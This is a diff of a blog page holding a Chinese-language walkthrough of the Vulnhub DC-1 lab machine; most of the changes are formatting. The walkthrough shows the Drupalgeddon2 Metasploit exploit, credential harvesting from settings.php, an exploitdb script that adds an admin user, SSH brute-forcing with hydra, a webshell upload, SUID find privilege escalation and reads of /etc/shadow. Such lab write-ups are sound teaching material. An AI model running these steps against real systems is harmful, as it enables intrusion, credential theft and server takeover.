@@ -903,7 +903,7 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="Vulnhub"><a href="#Vulnhub" class="headerlink" title="Vulnhub"></a>Vulnhub</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Vulnhub是一个提供各种漏洞环境的靶场平台，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用VMware或者VirtualBox运行。每个镜像会有破解的目标，挑战的目标是获取操作系统的root权限和查看flag。</p>
-<h3 id="部署方法"><a href="#部署方法" class="headerlink" title="部署方法"></a>部署方法</h3><p>官网：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/">https://www.vulnhub.com</a></p>
+<h3 id="部署方法"><a href="#部署方法" class="headerlink" title="部署方法"></a>部署方法</h3><p>官网：<a target="_blank" rel="noopener" href="https://www.vulnhub.com">https://www.vulnhub.com</a></p>
 <p>1.在官网搜索你想要的镜像,然后下载【建议下载 (Mirror)版本】</p>
 <p>2.下载好后解压得到<code>.ova</code>的文件，右击选择VMware进行打开</p>
 <p>3.在弹出的框中，选择存放的位置，然后点击导入</p>
@@ -914,117 +914,116 @@
 <p><strong>参考：</strong><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/104697">CVE-2018-7600 Drupal核心远程代码执行漏洞分析</a>     <a target="_blank" rel="noopener" href="https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/">Uncovering Drupalgeddon 2</a></p>
 <p><strong>攻击机：</strong>Kali/192.168.0.104</p>
 <h3 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h3><p>运行部署好的虚拟机，提示需要账号密码，该靶机不提供密码需要自己去渗透提权</p>
-<p><img src="https://i.loli.net/2020/05/16/NHTOKwQBoXLgEU8.png"></p>
+<p><img src="https://i.loli.net/2020/05/16/NHTOKwQBoXLgEU8.png" alt=""></p>
 <p><strong>因不知道DC-1靶机的IP，所有我们需要将靶机和攻击机kali放在同一个局域网里面，将Kali的网络适配器使用<code>桥接模式</code></strong></p>
 <h4 id="1-探测目标"><a href="#1-探测目标" class="headerlink" title="1.探测目标"></a>1.探测目标</h4><p><strong>方法一：使用arp-scan工具</strong></p>
 <p>探测同一区域中存活主机</p>
-<pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> arp-scan -l
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">$ sudo arp-scan -l
 
 -l 使用网络接口
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/16/TroRKx1gVv3hZF2.png"></p>
+<p><img src="https://i.loli.net/2020/05/16/TroRKx1gVv3hZF2.png" alt=""></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43221560/article/details/90550294">kali之arp-scan</a></p>
 <p><strong>方法二：使用netdiscover工具</strong></p>
 <p>探测存活主机</p>
-<pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> netdiscover -i eth0
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">$ sudo netdiscover -i eth0
 
 -i device 用于嗅探和注入数据包的网络接口
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/16/CKZuIEU3P9T4gqn.png"></p>
+<p><img src="https://i.loli.net/2020/05/16/CKZuIEU3P9T4gqn.png" alt=""></p>
 <p><a target="_blank" rel="noopener" href="https://manpages.debian.org/unstable/netdiscover/netdiscover.8.en.html">netdiscover用法</a></p>
 <p><strong>方法三：使用nmap工具</strong></p>
-<pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">ifconfig</span> <span class="token comment" spellcheck="true">#查看kali的ip【192.168.0.103】</span>
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">$ sudo ifconfig #查看kali的ip【192.168.0.103】
 $ nmap 192.168.0.0/24
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h4 id="2-查看目标开放端口"><a href="#2-查看目标开放端口" class="headerlink" title="2.查看目标开放端口"></a>2.查看目标开放端口</h4><pre class="line-numbers language-bash"><code class="language-bash">$ nmap -sV -p- 192.168.0.119
+<h4 id="2-查看目标开放端口"><a href="#2-查看目标开放端口" class="headerlink" title="2.查看目标开放端口"></a>2.查看目标开放端口</h4><pre class="line-numbers language-lang-bash"><code class="language-lang-bash">$ nmap -sV -p- 192.168.0.119
 
 -sV 用来扫描目标主机和端口上运行的软件的版本
 -p- 扫描0-65535全部端口
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/16/b4VFOxylKc9h2wS.png"></p>
+<p><img src="https://i.loli.net/2020/05/16/b4VFOxylKc9h2wS.png" alt=""></p>
 <p>目标靶机开放了80端口,在浏览器打开该站点</p>
 <h4 id="3-查看网页相关信息"><a href="#3-查看网页相关信息" class="headerlink" title="3.查看网页相关信息"></a>3.查看网页相关信息</h4><p>使用浏览器插件<code>Wappalyzer</code>，这个插件可以检测网站的CMS，框架，服务器等信息，</p>
 <p>可以看到该网站使用CMS为<code>Drupal</code>，其实在网页界面和底部都能发现是Drupal</p>
-<p><img src="https://i.loli.net/2020/05/16/FwIa8NtxdBA2JPi.png"></p>
+<p><img src="https://i.loli.net/2020/05/16/FwIa8NtxdBA2JPi.png" alt=""></p>
 <h3 id="二、漏洞查找与利用"><a href="#二、漏洞查找与利用" class="headerlink" title="二、漏洞查找与利用"></a>二、漏洞查找与利用</h3><h4 id="1-漏洞查找"><a href="#1-漏洞查找" class="headerlink" title="1.漏洞查找"></a>1.漏洞查找</h4><p>使用Metasploit搜索Drupal</p>
-<pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> msfdb init <span class="token operator">&amp;&amp;</span> msfconsole
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">$ sudo msfdb init && msfconsole
 $ search Drupal
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/16/KLMDfthcud8Ik6g.png"></p>
+<p><img src="https://i.loli.net/2020/05/16/KLMDfthcud8Ik6g.png" alt=""></p>
 <h4 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h4><p>优先选择上面查到模块的Rank为excellent并且时间较新的模块，这里我们使用第4个</p>
-<pre class="line-numbers language-bash"><code class="language-bash">$ use exploit/unix/webapp/drupal_drupalgeddon2 
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">$ use exploit/unix/webapp/drupal_drupalgeddon2 
 $ show options
-$ <span class="token keyword">set</span> RHOSTS 192.168.0.119
+$ set RHOSTS 192.168.0.119
 $ exploit 或者 run
-<span class="token comment" spellcheck="true">#当出现“Meterpreter session 1 opened”说明利用成功</span>
+#当出现“Meterpreter session 1 opened”说明利用成功
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/16/xjtqeUwfM5FpykP.png"></p>
-<p><img src="https://i.loli.net/2020/05/16/HI5EX9xpeVTyBcr.png"></p>
+<p><img src="https://i.loli.net/2020/05/16/xjtqeUwfM5FpykP.png" alt=""></p>
+<p><img src="https://i.loli.net/2020/05/16/HI5EX9xpeVTyBcr.png" alt=""></p>
 <p><a target="_blank" rel="noopener" href="http://sh1yan.top/2019/07/28/MSF-Command-Notes/">MSF之命令笔记篇</a></p>
-<h3 id="三、Getshell"><a href="#三、Getshell" class="headerlink" title="三、Getshell"></a>三、Getshell</h3><h4 id="1-获取普通shell"><a href="#1-获取普通shell" class="headerlink" title="1.获取普通shell"></a>1.获取普通shell</h4><pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span>shell
-<span class="token function">ls</span>
+<h3 id="三、Getshell"><a href="#三、Getshell" class="headerlink" title="三、Getshell"></a>三、Getshell</h3><h4 id="1-获取普通shell"><a href="#1-获取普通shell" class="headerlink" title="1.获取普通shell"></a>1.获取普通shell</h4><pre class="line-numbers language-lang-bash"><code class="language-lang-bash">meterpreter >shell
+ls
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/16/8gem543oQr6LZTc.png"></p>
+<p><img src="https://i.loli.net/2020/05/16/8gem543oQr6LZTc.png" alt=""></p>
 <p>发现有个<code>flag1.txt</code>，打开看一哈</p>
-<pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">cat</span> flag1.txt
-Every good CMS needs a config <span class="token function">file</span> - and so <span class="token keyword">do</span> you.
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">$ cat flag1.txt
+Every good CMS needs a config file - and so do you.
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>翻译：每一个好的CMS都需要一个配置文件，你也一样。</p>
 <p>百度查到Drupal的默认配置文件为 <code>/var/www/sites/default/settings.php</code></p>
 <p><a target="_blank" rel="noopener" href="https://www.iteye.com/blog/justcoding-1407697">drupal7的目录结构及术语</a></p>
-<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> /var/www/sites/default/settings.php
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">cat /var/www/sites/default/settings.php
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/16/rRTl5Ng4yoJDX1L.png"></p>
+<p><img src="https://i.loli.net/2020/05/16/rRTl5Ng4yoJDX1L.png" alt=""></p>
 <p>配置文件中看到了<code>flag2</code></p>
 <p>翻译:蛮力和字典攻击不行，唯一方法是获得访问权限(你将需要访问的)。你能用这些凭证做什么?</p>
 <p>同时，还有获得了数据库账号和密码</p>
 <pre><code>&#39;username&#39; =&gt; &#39;dbuser&#39;,
 &#39;password&#39; =&gt; &#39;R0ck3t&#39;,
-</code></pre>
-<h4 id="2-获取交互式shell"><a href="#2-获取交互式shell" class="headerlink" title="2.获取交互式shell"></a>2.获取交互式shell</h4><p>使用python反弹一个交互式shell，然后我们登陆数据库</p>
-<pre class="line-numbers language-bash"><code class="language-bash">$ python -c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span>
+</code></pre><h4 id="2-获取交互式shell"><a href="#2-获取交互式shell" class="headerlink" title="2.获取交互式shell"></a>2.获取交互式shell</h4><p>使用python反弹一个交互式shell，然后我们登陆数据库</p>
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">$ python -c 'import pty; pty.spawn("/bin/bash")'
 
 $ mysql -udbuser -p
 Enter password:R0ck3t
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/17/ugkBJPU3d7Hzlnv.png"></p>
+<p><img src="https://i.loli.net/2020/05/17/ugkBJPU3d7Hzlnv.png" alt=""></p>
 <p>查看数据库,在drupaldb库users表中发现admin用户</p>
-<pre class="line-numbers language-mysql"><code class="language-mysql">mysql> show databases; #[drupaldb]
+<pre class="line-numbers language-lang-mysql"><code class="language-lang-mysql">mysql> show databases; #[drupaldb]
 mysql> use drupaldb;
 mysql> show tables; #[users]
 mysql> select * from users;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/17/SGaPZVomDkRLpA2.png"></p>
+<p><img src="https://i.loli.net/2020/05/17/SGaPZVomDkRLpA2.png" alt=""></p>
 <p><img src="https://i.loli.net/2020/05/17/PFKyEd4zqncsVmC.png" alt="image-20200517095356679"></p>
 <p>可以看到admin用户的密码被加密了的，但是我们可以想办法修改密码或新增一个admin权限的用户</p>
 <p><strong>方法一：</strong>修改admin用户的密码</p>
 <p>使用Drupal对数据库的加密方法，生成一个新密码，然后把新的密码更新到admin用户</p>
 <p>加密脚本位置在<code>/var/www/scripts/password-hash.sh</code>下</p>
 <p>参考：<a target="_blank" rel="noopener" href="http://drupalchina.cn/node/2128">忘记Drupal的管理员密码的解决办法</a></p>
-<pre class="line-numbers language-bash"><code class="language-bash">$ php scripts/password-hash.sh jwt  <span class="token comment" spellcheck="true">#生成新密码jwt</span>
-<span class="token comment" spellcheck="true"># hash:$S$D5HTFVPccZrLCEJ7CzFvPvvh5zlSRhjF6E7AZ0Wg0R.cDGjgChoX</span>
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">$ php scripts/password-hash.sh jwt  #生成新密码jwt
+# hash:$S$D5HTFVPccZrLCEJ7CzFvPvvh5zlSRhjF6E7AZ0Wg0R.cDGjgChoX
 
-mysql<span class="token operator">></span> update drupaldb.users <span class="token keyword">set</span> pass<span class="token operator">=</span><span class="token string">"<span class="token variable">$S</span><span class="token variable">$D5HTFVPccZrLCEJ7CzFvPvvh5zlSRhjF6E7AZ0Wg0R</span>.cDGjgChoX"</span> where name<span class="token operator">=</span><span class="token string">"admin"</span><span class="token punctuation">;</span>
+mysql> update drupaldb.users set pass="$S$D5HTFVPccZrLCEJ7CzFvPvvh5zlSRhjF6E7AZ0Wg0R.cDGjgChoX" where name="admin";
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2020/05/17/Ihmut4gaZNVyBX5.png" alt="image-20200517101339236"></p>
 <p><img src="https://i.loli.net/2020/05/17/q6T9HNAlZUmwFsh.png" alt="image-20200517101410076"></p>
 <p><strong>方法二：</strong>新增一个admin权限的用户</p>
 <p>在exploitdb中有一个针对Drupal 7版本的攻击脚本，可以增加一个admin权限的用户账号</p>
 <p>查看Drupal版本,确定Drupal版本为7.24</p>
-<pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">cat</span> /var/www/includes/bootstrap.inc <span class="token operator">|</span> <span class="token function">grep</span> VERSION
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">$ cat /var/www/includes/bootstrap.inc | grep VERSION
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2020/05/17/2TnfzyQHIAXkidc.png" alt="image-20200517130545021"></p>
-<pre class="line-numbers language-bash"><code class="language-bash">msf <span class="token operator">></span> searchsploit drupal
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">msf > searchsploit drupal
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/17/fvSrwXp6Al5BmHz.png"></p>
+<p><img src="https://i.loli.net/2020/05/17/fvSrwXp6Al5BmHz.png" alt=""></p>
 <p>攻击脚本适用于7.31以下，所以适合7.24版本,可以利用漏洞增加admin权限用户</p>
 <p>增加有admin权限的用户：admin1/admin1</p>
-<pre class="line-numbers language-bash"><code class="language-bash">python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.0.100 -u admin1 -p admin1
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.0.100 -u admin1 -p admin1
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>输入用户名/密码【admin/jwt或者admin1/admin1】，尝试登陆 </p>
-<p><img src="https://i.loli.net/2020/05/17/2ugc4GCWK6pZHfQ.png"></p>
+<p><img src="https://i.loli.net/2020/05/17/2ugc4GCWK6pZHfQ.png" alt=""></p>
 <p>成功登陆</p>
-<p><img src="https://i.loli.net/2020/05/17/2yNEYavswqhoxJg.png"></p>
+<p><img src="https://i.loli.net/2020/05/17/2yNEYavswqhoxJg.png" alt=""></p>
 <p>在后台左上角的<code>Find content</code>中发现flag3</p>
 <p><img src="https://i.loli.net/2020/05/17/Pl3E8IFh4SDb6gj.png" alt="image-20200517102352344"></p>
 <p>flag3的信息中提到了passwd和shadow,很明显就是<code>/etc/passwd和/etc/shadow</code>，还提到了<code>find、perms、-exec</code>，这几个是提权用的。</p>
@@ -1034,62 +1033,62 @@ mysql<span class="token operator">></span> update drupaldb.users <span class="to
 <p> <a target="_blank" rel="noopener" href="https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/">/etc/passwd详情</a></p>
 <p>etc/shadow是/etc/passwd的影子文件，存有密码信息</p>
 </blockquote>
-<pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">cat</span> /etc/passwd
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">$ cat /etc/passwd
 或者
-$ <span class="token function">tail</span> -3 /etc/passwd  <span class="token comment" spellcheck="true">#为了方便截图，只显示文件的最后三行</span>
+$ tail -3 /etc/passwd  #为了方便截图，只显示文件的最后三行
 
-$ <span class="token function">cat</span> /etc/shadow <span class="token comment" spellcheck="true">#权限不够查看失败</span>
+$ cat /etc/shadow #权限不够查看失败
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/17/HonD8RieWJgrS1p.png"></p>
-<p>发现有个叫<code>flag4</code>的账号，但是查看使用<code>/etc/shadow</code>失败，但是前面nmap扫描的时候发现了 ssh 服务，现在又发现了 flag4 用户，所以尝试使用<code>hydra </code>进行密码的暴力猜解</p>
-<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz 192.168.0.100 <span class="token function">ssh</span>
+<p><img src="https://i.loli.net/2020/05/17/HonD8RieWJgrS1p.png" alt=""></p>
+<p>发现有个叫<code>flag4</code>的账号，但是查看使用<code>/etc/shadow</code>失败，但是前面nmap扫描的时候发现了 ssh 服务，现在又发现了 flag4 用户，所以尝试使用<code>hydra</code>进行密码的暴力猜解</p>
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">sudo hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz 192.168.0.100 ssh
 或者
-<span class="token function">sudo</span> hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.0.100
+sudo hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.0.100
 
-<span class="token comment" spellcheck="true">#ip变成192.168.0.100，是应为我重启了，靶机ip变了</span>
+#ip变成192.168.0.100，是应为我重启了，靶机ip变了
 -l  指定破解的用户
 -P  指定密码字典
 ssh://ip 指定使用协议和ip地址
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/16/Kb8FI9HYGaqLfkM.png"></p>
+<p><img src="https://i.loli.net/2020/05/16/Kb8FI9HYGaqLfkM.png" alt=""></p>
 <p><a target="_blank" rel="noopener" href="http://www.ha97.com/5186.html">暴力密码在线破解工具Hydra详解</a></p>
 <p>使用得到用户名密码【 flag4/orange】，登录靶机</p>
-<p><img src="https://i.loli.net/2020/05/16/6clWopZR2OfKEQb.png"></p>
+<p><img src="https://i.loli.net/2020/05/16/6clWopZR2OfKEQb.png" alt=""></p>
 <p>也可以用kali直接远程连接</p>
-<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ssh</span> flag4@192.168.0.100
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">ssh flag4@192.168.0.100
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/16/V3eb5srdkzi2fZF.png"></p>
-<pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">ls</span>
-$ <span class="token function">cat</span> flag4.txt
+<p><img src="https://i.loli.net/2020/05/16/V3eb5srdkzi2fZF.png" alt=""></p>
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">$ ls
+$ cat flag4.txt
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/17/qmtczhZHVaik3xE.png"></p>
+<p><img src="https://i.loli.net/2020/05/17/qmtczhZHVaik3xE.png" alt=""></p>
 <p>flag4提示flag在root目录下，在<code>/root</code>下发现<code>thefinalflag.txt</code>，但是没有读取的权限</p>
-<p><img src="https://i.loli.net/2020/05/17/wLYZhdx39znRMGv.png"></p>
+<p><img src="https://i.loli.net/2020/05/17/wLYZhdx39znRMGv.png" alt=""></p>
 <h4 id="3-上传冰蝎马获取shell"><a href="#3-上传冰蝎马获取shell" class="headerlink" title="3.上传冰蝎马获取shell"></a>3.上传冰蝎马获取shell</h4><p>当然你还可以利用meterperter的shell直接上传冰蝎的shell。</p>
-<pre class="line-numbers language-bash"><code class="language-bash">meterperter<span class="token operator">></span> upload /home/jwt/Desktop/shell.php /var/www/shell.php
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">meterperter> upload /home/jwt/Desktop/shell.php /var/www/shell.php
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>然后冰蝎连接就可以了</p>
 <h3 id="四、提升权限"><a href="#四、提升权限" class="headerlink" title="四、提升权限"></a>四、提升权限</h3><p>根据flag3和flag4都提到了find,所以下面我们利用find文件提权</p>
-<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/84872644">Linux下用SUID提权</a>、<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40510246/article/details/95939784?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase">linux提权-SUID提权</a>、<a target="_blank" rel="noopener" href="https://www.cnblogs.com/huchong/p/9961625.html">find命令之exec</a></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/84872644">Linux下用SUID提权</a>、<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40510246/article/details/95939784?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase">linux提权-SUID提权</a>、<a target="_blank" rel="noopener" href="https://www.cnblogs.com/huchong/p/9961625.html">find命令之exec</a></p>
 <blockquote>
 <p>SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。</p>
 </blockquote>
-<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#查找具有root权限的SUID的文件</span>
-$ <span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f 2<span class="token operator">></span>/dev/null
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">#查找具有root权限的SUID的文件
+$ find / -perm -u=s -type f 2>/dev/null
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/17/oBHRnfd6O9ZrS38.png"></p>
+<p><img src="https://i.loli.net/2020/05/17/oBHRnfd6O9ZrS38.png" alt=""></p>
 <p>可以看到find命令具有SUID权限，如果find以SUID权限运行，所有通过find执行的命令都会以root权限运行。</p>
-<pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">touch</span> jwt
-<span class="token comment" spellcheck="true">#查找根目录下名为jwt的文件并执行shell</span>
-$ <span class="token function">find</span> / -name jwt -exec <span class="token string">"/bin/sh"</span> \<span class="token punctuation">;</span>
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">$ touch jwt
+#查找根目录下名为jwt的文件并执行shell
+$ find / -name jwt -exec "/bin/sh" \;
 
-<span class="token comment" spellcheck="true">#-exec 参数后面跟的是command命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以在分号前面加反斜杠。</span>
+#-exec 参数后面跟的是command命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以在分号前面加反斜杠。
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2020/05/17/EGqIUHOpNa6nmVg.png" alt="image-20200517113343425"></p>
 <p>可以看到已经成功提权拿到root shell，接下来就来查看最终的flag吧</p>
-<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /root
-<span class="token function">ls</span>
-<span class="token function">cat</span> thefinalflag.txt
+<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">cd /root
+ls
+cat thefinalflag.txt
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2020/05/17/yrWDTYFC6hRvUsu.png" alt="image-20200517113640702"></p>
 <p>到这里我们就成功获取到了5个flag,并成功走完了整个渗透流程</p>
@@ -1103,7 +1102,7 @@ $ <span class="token function">find</span> / -name jwt -exec <span class="token 
 <p><code>sudo hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.0.100</code></p>
 <p>参考：<a target="_blank" rel="noopener" href="http://www.ha97.com/5186.html">暴力密码在线破解工具Hydra详解</a></p>
 <p>4.suid提权</p>
-<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/84872644">Linux下用SUID提权</a>、<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40510246/article/details/95939784?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase">linux提权-SUID提权</a>、<a target="_blank" rel="noopener" href="https://www.cnblogs.com/huchong/p/9961625.html">find命令之exec</a></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/84872644">Linux下用SUID提权</a>、<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40510246/article/details/95939784?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase">linux提权-SUID提权</a>、<a target="_blank" rel="noopener" href="https://www.cnblogs.com/huchong/p/9961625.html">find命令之exec</a></p>
 <h2 id="赞助💰"><a href="#赞助💰" class="headerlink" title="赞助💰"></a>赞助💰</h2><p>如果你觉得对你有帮助，你可以赞助我一杯冰可乐！嘻嘻🤭</p>
 <table>
   <tbody>
@@ -1894,7 +1893,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">1067.4k</span>&nbsp;字
+                class="white-color">712.3k</span>&nbsp;字
             
             
             
@@ -2125,6 +2124,22 @@ $(function () {
     
 
         
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
 </body>
 
 </html>
